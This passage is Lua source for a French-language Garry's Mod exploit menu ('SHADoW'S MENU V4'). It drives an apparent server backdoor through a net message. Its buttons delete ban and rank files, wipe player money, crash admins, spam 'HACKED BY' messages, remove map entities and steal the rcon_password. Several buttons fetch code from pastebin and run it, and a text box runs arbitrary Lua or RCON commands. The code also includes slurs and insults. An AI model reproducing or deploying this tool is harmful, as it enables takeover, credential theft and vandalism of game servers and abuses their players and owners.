surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo3.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo4 = vgui.Create("DButton", DScrollPanel)
zilnixestbo4:SetSize( 350, 20 )
zilnixestbo4:SetPos( 100, 275 )
zilnixestbo4:SetText("Reset tout l'argent du serveur")
zilnixestbo4:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo4.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo4.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo5 = vgui.Create("DButton", DScrollPanel )
zilnixestbo5:SetSize( 350, 20 )
zilnixestbo5:SetPos( 100, 475 )
zilnixestbo5:SetText("Supprimer les grades")
zilnixestbo5:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo5.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo5.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo6 = vgui.Create("DButton", DScrollPanel )
zilnixestbo6:SetSize( 350, 20 )
zilnixestbo6:SetPos( 100, 375 )
zilnixestbo6:SetText("STOP SPAM CHAT")
zilnixestbo6:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo6.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo6.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString("timer.Stop( \"memer\")")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo7 = vgui.Create("DButton", DScrollPanel)
zilnixestbo7:SetSize( 350, 20 )
zilnixestbo7:SetPos( 100, 200 )
zilnixestbo7:SetText("Hurlement sur tous les joueurs")
zilnixestbo7:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo7.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo7.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo8 = vgui.Create("DButton", DScrollPanel)
zilnixestbo8:SetSize( 350, 20 )
zilnixestbo8:SetPos( 100, 225 )
zilnixestbo8:SetText("Changer le model des joueurs")
zilnixestbo8:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo8.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo8.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo9 = vgui.Create("DButton", DScrollPanel)
zilnixestbo9:SetSize( 350, 20 )
zilnixestbo9:SetPos( 100, 125 )
zilnixestbo9:SetText("SUPER SPAM VISUEL/SONORE 3")
zilnixestbo9:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo9.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo9.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo10 = vgui.Create("DButton", DScrollPanel)
zilnixestbo10:SetSize( 350, 20 )
zilnixestbo10:SetPos( 100, 150 )
zilnixestbo10:SetText("SUPER SPAM VISUEL/SONORE 4")
zilnixestbo10:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo10.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo10.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/UmAvgxUu\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo11 = vgui.Create("DButton", DScrollPanel)
zilnixestbo11:SetSize( 350, 20 )
zilnixestbo11:SetPos( 100, 300 )
zilnixestbo11:SetText("SPAM CHAT")
zilnixestbo11:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo11.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo11.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString("timer.Create( \"memer\", 0.2, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"HACKED BY SHADoW'S ESPECE DE FILS DE VIOLE\")]]) end)")
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo12 = vgui.Create("DButton", DScrollPanel)
zilnixestbo12:SetSize( 350, 20 )
zilnixestbo12:SetPos( 100, 325 )
zilnixestbo12:SetText("Faire voler tous les joueurs")
zilnixestbo12:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo12.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo12.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo13 = vgui.Create("DButton", DScrollPanel)
zilnixestbo13:SetSize( 350, 20 )
zilnixestbo13:SetPos( 100, 350 )
zilnixestbo13:SetText("Crash tous les admins/vip")
zilnixestbo13:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo13.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo13.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo14 = vgui.Create("DButton", DScrollPanel)
zilnixestbo14:SetSize( 350, 20 )
zilnixestbo14:SetPos( 100, 75 )
zilnixestbo14:SetText("SUPER SPAM VISUEL/SONORE 1")
zilnixestbo14:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo14.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo14.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3MJcZm2f\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo15 = vgui.Create("DButton", DScrollPanel)
zilnixestbo15:SetSize( 350, 20 )
zilnixestbo15:SetPos( 100, 400 )
zilnixestbo15:SetText("1000000 toutes les 0.1sec tous les joueurs")
zilnixestbo15:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo15.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo15.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent1000000\", 0.1, 0, function() v:addMoney(1000000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo16 = vgui.Create("DButton", DScrollPanel)
zilnixestbo16:SetSize( 350, 20 )
zilnixestbo16:SetPos( 100, 425 )
zilnixestbo16:SetText("Voler le rcon_password")
zilnixestbo16:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo16.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo16.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/a04ea6g8\",function(b,l,h,c)RunString(b)end,nil)" ) // Check
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)
end
local zilnixestbo17 = vgui.Create("DButton", DScrollPanel)
zilnixestbo17:SetSize( 350, 20 )
zilnixestbo17:SetPos( 100, 450 )
zilnixestbo17:SetText("SOUNDBOARD - Supremacist")
zilnixestbo17:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo17.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo17.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/soundboard/suprem.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
end
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-back\")" )
net.WriteBit(1)
net.SendToServer()
end
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-back\")" )
net.WriteBit(1)
net.SendToServer()
end
zilnixestbo17.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo18 = vgui.Create("DButton", DScrollPanel)
zilnixestbo18:SetSize( 350, 20 )
zilnixestbo18:SetPos( 100, 500 )
zilnixestbo18:SetText("Faire danser tous le monde")
zilnixestbo18:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo18.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 385, 25 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname SEIZED BY NTK TEAM EXPLOIT" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 275, 25 )
Lancer_rcon_commande:SetText("RCON Command")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 165, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 50, 25 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG avec ça tu peux baiser le serveur même si il enleve la backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )
function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Choisir des cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(250,400)
iZNX.PlayerSelector:SetTitle("Joueur(s) à cibler")
iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 125) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 75, 75, 75 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(255, 255, 255, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 50, 50, 50 ) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = RatesScaleLevel
concommand.Add( "SHADoWS", function()
if FillFrameRates == "STEAM_0:1:219919521"
 or FillFrameRates == "STEAM_0:1:219919521"
  or FillFrameRates == "STEAM_0:1:219919521"
   or FillFrameRates == "STEAM_0:1:219919521"
    or FillFrameRates == "STEAM_0:1:219919521"
	 or FillFrameRates == "STEAM_0:1:219919521" 
or FillFrameRates == "STEAM_0:1:219919521"
 or FillFrameRates == "STEAM_0:1:219919521"
  or FillFrameRates == "STEAM_0:1:219919521"
 
 
then iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(750,750)
iZNX.Menu:SetTitle(" ")
iZNX.Menu:Center()
iZNX.Menu:MakePopup()
iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor( Color(0, 80, 255, 255) )
surface.DrawRect( 0, 0, w, h )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect( 35, 100, w - 60, h - 150 )
surface.SetDrawColor( Color(0, 0, 0, 0) )
surface.DrawOutlinedRect( 35, 100, w - 60, h - 152 )
surface.DrawOutlinedRect( 36, 101, w - 62, h - 154 )
surface.SetDrawColor( Color(0, 0, 0, 0) )
surface.DrawRect( 160, 20, w - 300, h - 680 )
surface.SetDrawColor( Color(255, 255, 255, 0) )
surface.DrawOutlinedRect( 160, 20, w - 300, h - 680 )
surface.DrawOutlinedRect( 161, 21, w - 302, h - 682 )
draw.DrawText( "SHADoW'S MENU V4", "DermaLarge", 310, 25, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
draw.DrawText( " ", "Trebuchet24", 175, 50, Color(25,25,25, 250) )
end
local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 80, iZNX.Menu:GetTall() - 180 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 50, 120 )
Plist:SetName( "" )
iZNX.MakeFunctionButton( iZNX.Menu, 620, 30, "Charger Sauvegarde", iZNX.LoadConfig, "Charger une Config" )
iZNX.MakeFunctionButton( iZNX.Menu, 50, 30, "Sauvegarder", iZNX.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(255,255,255, 255) )
end
local x = 10
